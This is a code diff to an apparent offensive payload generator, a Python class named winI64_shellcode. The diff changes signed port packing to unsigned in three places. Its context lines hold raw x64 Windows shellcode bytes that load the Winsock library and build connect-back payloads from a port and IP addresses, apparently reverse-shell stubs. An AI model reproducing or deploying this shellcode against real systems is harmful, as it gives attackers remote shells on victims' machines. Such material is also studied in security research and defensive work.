@@ -118,7 +118,7 @@ class winI64_shellcode():
         self.shellcode2 = ("\x5d\x49\xbe\x77\x73\x32\x5f\x33"
                            "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
                            "\x49\x89\xe5\x49\xbc\x02\x00")
-        self.shellcode2 += struct.pack('!h', self.PORT)
+        self.shellcode2 += struct.pack('!H', self.PORT)
         self.shellcode2 += self.pack_ip_addresses()
         self.shellcode2 += ("\x41\x54"
                             "\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
@@ -422,7 +422,7 @@ class winI64_shellcode():
                             #"\x1f\x90"
                             #"\x7f\x00\x00\x01"
                             )
-        self.shellcode2 += struct.pack('!h', self.PORT)
+        self.shellcode2 += struct.pack('!H', self.PORT)
         self.shellcode2 += self.pack_ip_addresses()
         self.shellcode2 += ("\x41\x54"
                             "\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
@@ -695,7 +695,7 @@ class winI64_shellcode():
                         "\xc0\x4d\x31\xc9\x41\x50\x41\x50\x49\xba\x3a\x56\x79\xa7\x00"
                         "\x00\x00\x00\xff\xd5\xe9\x9e\x00\x00\x00\x5a\x48\x89\xc1\x49"
                         "\xb8")
-        self.shellcode2 += struct.pack("<h", self.PORT)    
+        self.shellcode2 += struct.pack("<H", self.PORT)    
         self.shellcode2 += ("\x00\x00\x00\x00\x00\x00\x4d\x31\xc9\x41\x51\x41"
                         "\x51\x6a\x03\x41\x51\x49\xba\x57\x89\x9f\xc6\x00\x00\x00\x00"
                         "\xff\xd5\xeb\x7c\x48\x89\xc1\x48\x31\xd2\x41\x58\x4d\x31\xc9"
